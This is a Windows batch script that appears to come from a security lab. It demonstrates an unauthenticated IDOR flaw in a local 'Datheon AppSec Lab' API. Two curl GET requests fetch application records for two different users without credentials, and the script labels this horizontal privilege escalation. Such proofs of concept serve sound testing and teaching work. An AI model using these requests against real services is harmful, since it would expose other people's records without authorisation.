@echo off
REM cURL Proof of Concept: Unauthenticated IDOR Parameter Extraction (Windows)
REM Target: Datheon AppSec Lab (http://localhost:5000)

echo ==========================================================
echo  [POC 1] Fetching User A (DT-2026-001) without credentials
echo ==========================================================
curl -i -s -X GET "http://localhost:5000/api/v1/applications/DT-2026-001" -H "Accept: application/json"

echo.
echo ==========================================================
echo  [POC 2] Horizontal Privilege Escalation to User B (DT-2026-002)
echo ==========================================================
curl -i -s -X GET "http://localhost:5000/api/v1/applications/DT-2026-002" -H "Accept: application/json"
echo.
